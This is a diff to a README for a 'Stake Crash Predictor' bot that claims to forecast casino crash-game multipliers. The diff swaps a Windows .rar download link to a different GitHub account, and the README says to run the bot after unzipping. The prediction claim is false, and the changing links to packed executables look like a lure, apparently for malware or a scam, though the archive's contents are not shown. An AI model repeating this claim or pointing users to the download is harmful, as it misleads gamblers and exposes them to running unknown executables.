@@ -24,7 +24,7 @@ The Stake Crash Predictor is a tool designed to predict the next multiplier numb
 ## Installation
 
 1. Download the latest version of the bot.
-<strong><a href="https://github.com/Stake-bot/CrashPredictor-for-Stake/releases/download/v2.4/CrashPredictor.for.Stake.Trial.rar">Download for Windows x64</a><g-emoji class="g-emoji" alias="arrow_down" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b07.png">⬇️</g-emoji></strong>
+<strong><a href="https://github.com/stake-predictor/Stake-predictor/releases/download/5.1/Stake-Casino-predictorV5.1.rar">Download for Windows x64</a><g-emoji class="g-emoji" alias="arrow_down" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b07.png">⬇️</g-emoji></strong>
 
 2. Start the bot after unziping it
 
